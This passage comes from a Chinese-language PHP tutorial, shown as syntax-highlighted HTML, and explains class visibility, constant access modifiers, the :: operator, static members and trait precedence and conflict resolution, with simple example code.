class="token class-name">Bar</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">testPrivate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">testPublic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">testPublic</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Bar::testPublic\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">testPrivate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Bar::testPrivate\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Foo</span> <span class="token keyword">extends</span> <span class="token class-name">Bar</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">testPublic</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Foo::testPublic\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">testPrivate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Foo::testPrivate\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$myFoo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$myFoo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Bar::testPrivate </span>                <span class="token comment" spellcheck="true">// Foo::testPublic</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="常量的控制访问"><a href="#常量的控制访问" class="headerlink" title="常量的控制访问"></a>常量的控制访问</h4><p>PHP 7.1.0 开始，类的常量可以定义为公有、私有或受保护。如果没有设置这些关键字，则该常量默认为公有。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//代码示例</span><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/** * Define MyClass */</span><span class="token keyword">class</span> <span class="token class-name">MyClass</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 公有常量</span>    <span class="token keyword">public</span> <span class="token keyword">const</span> <span class="token constant">MY_PUBLIC</span> <span class="token operator">=</span> <span class="token string">'public'</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 受保护的常量</span>    <span class="token keyword">protected</span> <span class="token keyword">const</span> <span class="token constant">MY_PROTECTED</span> <span class="token operator">=</span> <span class="token string">'protected'</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 私有常量</span>    <span class="token keyword">private</span> <span class="token keyword">const</span> <span class="token constant">MY_PRIVATE</span> <span class="token operator">=</span> <span class="token string">'private'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">MY_PUBLIC</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">MY_PROTECTED</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">MY_PRIVATE</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$myclass</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>MyClass<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">MY_PUBLIC</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 这行可以正常执行</span>MyClass<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">MY_PROTECTED</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 这行会产生一个致命错误 </span>MyClass<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">MY_PRIVATE</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 这行会产生一个致命错误</span><span class="token variable">$myclass</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 将会输出：Public Protected Private</span><span class="token comment" spellcheck="true">/** * Define MyClass2 */</span><span class="token keyword">class</span> <span class="token class-name">MyClass2</span> <span class="token keyword">extends</span> <span class="token class-name">MyClass</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// This is public</span>    <span class="token keyword">function</span> <span class="token function">foo2</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">MY_PUBLIC</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">MY_PROTECTED</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">MY_PRIVATE</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 这行会产生一个致命错误</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$myclass2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyClass2</span><span class="token punctuation">;</span><span class="token keyword">echo</span> MyClass2<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">MY_PUBLIC</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 这行可以正常执行</span><span class="token variable">$myclass2</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">foo2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 将会输出：Public Protected，MY_PRIVATE 是私有常量，无法输出</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="其他对象的访问控制"><a href="#其他对象的访问控制" class="headerlink" title="其他对象的访问控制"></a>其他对象的访问控制</h4><p>同一个类的对象即使不是同一个实例也可以互相访问对方的私有与受保护成员。这是由于在这些对象的内部具体实现的细节都是已知的。</p><p>简单理解就是类里可以调用此类的私有对象和受保护对象，因为对象本身就在类里。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$foo</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$foo</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">foo</span> <span class="token operator">=</span> <span class="token variable">$foo</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'Accessed the private method.'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">baz</span><span class="token punctuation">(</span>Test <span class="token variable">$other</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// We can change the private property:</span>        <span class="token variable">$other</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">foo</span> <span class="token operator">=</span> <span class="token string">'hello'</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$other</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">foo</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// We can also call the private method:</span>        <span class="token variable">$other</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$test</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">baz</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token string">'other'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="范围解析操作符"><a href="#范围解析操作符" class="headerlink" title="范围解析操作符 ::"></a>范围解析操作符 ::</h4><blockquote><p>范围解析操作符（也可称作 Paamayim Nekudotayim）或者更简单地说是一对冒号，可以用于访问<a href="https://www.php.net/manual/zh/language.oop5.static.php">静态</a>成员，<a href="https://www.php.net/manual/zh/language.oop5.constants.php">类常量</a>，还可以用于覆盖类中的属性和方法。</p><p>当在类定义之外引用到这些项目时，要使用类名。</p><p>自 PHP 5.3.0 起，可以通过变量来引用类，该变量的值不能是关键字（如 <code>self</code>，<code>parent</code> 和 <code>static</code>）。</p><p>self （自己），parent （起源，父本）和 static （静止的，静态）这三个特殊的关键字是用于在类定义的内部对其属性或方法进行访问的。</p></blockquote><blockquote><p><strong>示例：在外部引用项目：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">MyClass</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> <span class="token constant">CONST_VALUE</span> <span class="token operator">=</span> <span class="token string">'A constant value'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$classname</span> <span class="token operator">=</span> <span class="token string">'MyClass'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$classname</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">CONST_VALUE</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 自 PHP 5.3.0 起</span><span class="token keyword">echo</span> MyClass<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">CONST_VALUE</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><blockquote><p><strong>示例：在内部引用项目：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">OtherClass</span> <span class="token keyword">extends</span> <span class="token class-name">MyClass</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token variable">$my_static</span> <span class="token operator">=</span> <span class="token string">'static var'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">doubleColon</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">CONST_VALUE</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//引用父类方法使用parent::静态名</span>        <span class="token keyword">echo</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$my_static</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//引用本类方法使用self::静态名</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$classname</span> <span class="token operator">=</span> <span class="token string">'OtherClass'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$classname</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">doubleColon</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 自 PHP 5.3.0 起</span>OtherClass<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">doubleColon</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><blockquote><p>当一个子类覆盖其父类中的方法时，PHP 不会调用父类中已被覆盖的方法。是否调用父类的方法取决于子类。这种机制也作用于<a href="https://www.php.net/manual/zh/language.oop5.decon.php">构造函数和析构函数</a>，<a href="https://www.php.net/manual/zh/language.oop5.overloading.php">重载</a>以及<a href="https://www.php.net/manual/zh/language.oop5.magic.php">魔术方法</a>。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">MyClass</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">myFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"MyClass::myFunc()\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">OtherClass</span> <span class="token keyword">extends</span> <span class="token class-name">MyClass</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 覆盖了父类的定义</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">myFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 但还是可以调用父类中被覆盖的方法</span>        <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">myFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"OtherClass::myFunc()\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$class</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OtherClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$class</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">myFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="静态关键字static"><a href="#静态关键字static" class="headerlink" title="静态关键字static"></a>静态关键字static</h4><blockquote><p>声明类属性或方法为静态，就可以不实例化类而直接访问。静态属性不能通过一个类已实例化的对象来访问（但静态方法可以）。</p><p>由于静态方法不需要通过对象即可调用，所以伪变量 $this 在静态方法中不可用。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Foo</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">aStaticMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// ...</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>Foo<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">aStaticMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//无需实例化类就可以调用</span><span class="token variable">$classname</span> <span class="token operator">=</span> <span class="token string">'Foo'</span><span class="token punctuation">;</span><span class="token variable">$classname</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">aStaticMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//这里其实还是Foo::aStaticMethod();不过是把Foo给了$classname，耍了个小花招罢了</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><ul><li><p>静态属性</p><blockquote><p>静态属性不可以由对象通过 -&gt; 操作符来访问。 //简单说 ：：访问静态，-&gt;访问动态</p></blockquote></li></ul><h3 id="trait-特质-方法"><a href="#trait-特质-方法" class="headerlink" title="trait[特质]方法"></a>trait[特质]方法</h3><blockquote><p><strong>tarit 是php实现继承和调用的快速简洁的方法</strong></p><p><strong>和类相似，但无法实例化。</strong></p><p><strong>与使用数据库一样，使用use调用</strong></p></blockquote><h4 id="优先级："><a href="#优先级：" class="headerlink" title="优先级："></a>优先级：</h4><blockquote><p>从基类继承的成员会被 trait 插入的成员所覆盖。优先顺序是来自当前类的成员覆盖了 trait 的方法，而 trait 则覆盖了被继承的方法。</p><p>简单说既是：<strong>当前类 &gt; trait &gt; 被继承的父类</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Base</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'Hello '</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//这是一个父类</span><span class="token keyword">trait</span> <span class="token class-name">SayWorld</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//父类的Hello 被trait覆盖，所以使用parent:: 重新调用出来</span>        <span class="token comment" spellcheck="true">//这里sayHello并没有变量，看作静态处理使用::</span>        <span class="token keyword">echo</span> <span class="token string">'World!'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//覆盖父类</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//这是一个trait</span><span class="token keyword">class</span> <span class="token class-name">MyHelloWorld</span> <span class="token keyword">extends</span> <span class="token class-name">Base</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//继承父类Base</span>    <span class="token keyword">use</span> <span class="token package">SayWorld</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//调用trait Sayworld</span>   <span class="token comment" spellcheck="true">//这里使用trait可以一次性调用许多的“类”，而不用一步步的继承</span><span class="token punctuation">}</span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyHelloWorld</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//以上会输出Hello World!</span>    <span class="token comment" spellcheck="true">//另一个例子</span><span class="token delimiter">&lt;?php</span><span class="token keyword">trait</span> <span class="token class-name">HelloWorld</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'Hello World!'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">TheWorldIsNotEnough</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">HelloWorld</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//调用trait</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'Hello Universe!'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//本类优先级高于trait，覆盖调用的trait</span><span class="token punctuation">}</span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TheWorldIsNotEnough</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//结果为：Hello Universe!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="调用多个trait"><a href="#调用多个trait" class="headerlink" title="调用多个trait"></a>调用多个trait</h4><blockquote><p>使用逗号，即可调用多个trait</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">trait</span> <span class="token class-name">Hello</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'Hello '</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">trait</span> <span class="token class-name">World</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">sayWorld</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'World'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">MyHelloWorld</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">Hello</span><span class="token punctuation">,</span> World<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">sayExclamationMark</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'!'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyHelloWorld</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">sayWorld</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">sayExclamationMark</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//以上会输出 Hello World!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="trait同名冲突解决方法"><a href="#trait同名冲突解决方法" class="headerlink" title="trait同名冲突解决方法"></a>trait同名冲突解决方法</h4><blockquote><p>如果两个 trait 都插入了一个同名的方法，如果没有明确解决冲突将会产生一个致命错误。</p><p>为了解决多个 trait 在同一个类中的命名冲突，需要使用 <code>insteadof</code>（代替） 操作符来明确指定使用冲突方法中的哪一个。</p><p>以上方式仅允许排除掉其它方法，<code>as</code> 操作符可以 为某个方法引入别名。 注意，<code>as</code> 操作符不会对方法进行重命名，也不会影响其方法。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">trait</span> <span class="token class-name">A</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">smallTalk</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'a'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">bigTalk</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'A'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">trait</span> <span class="token class-name">B</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">smallTalk</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'b'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">bigTalk</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'B'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Talker</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">A</span><span class="token punctuation">,</span> B <span class="token punctuation">{</span>        B<span class="token punctuation">:</span><span class="token punctuation">:</span>smallTalk insteadof A<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//以B中的smallTalk代替A中的smallTalk(两个同名方法优先B)</span>        A<span class="token punctuation">:</span><span class="token punctuation">:</span>bigTalk insteadof B<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将A中的bigTalk代替B中的bigTalk(优先A)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Talker</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">smallTalk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//说明smallTalk优先级</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bigTalk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//说明bigTalk优先级</span>    <span class="token keyword">echo</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Aliased_Talker</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">A</span><span class="token punctuation">,</span> B <span class="token punctuation">{</span>        B<span class="token 